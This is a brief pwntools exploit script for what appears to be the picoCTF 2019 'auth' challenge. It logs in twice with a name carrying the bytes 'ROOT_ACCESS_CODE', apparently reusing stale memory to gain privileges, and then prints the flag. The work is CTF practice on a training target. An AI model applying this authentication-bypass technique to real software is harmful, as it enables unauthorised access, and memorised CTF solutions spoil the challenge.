from pwn import *

e = ELF("./auth")

context.binary = e.path

if "--remote" in sys.argv:
  p = remote("2019shell1.picoctf.com", 21899)
else:
  p = process(e.path
  )
  #{"LD_PRELOAD": libc.path})

p.sendlineafter(">", "login")
p.sendlineafter("length", "32")
p.sendlineafter("enter", "A" * 8 + p64(0x4343415f544f4f52) + p64(0x45444f435f535345))
p.sendlineafter(">", "logout")
p.sendlineafter(">", "login")
p.sendlineafter("length", "32")
p.sendlineafter("enter", "A" * 8 + p64(0x4343415f544f4f52) + p64(0x45444f435f535345))
p.sendlineafter(">", "print-flag")


p.interactive()
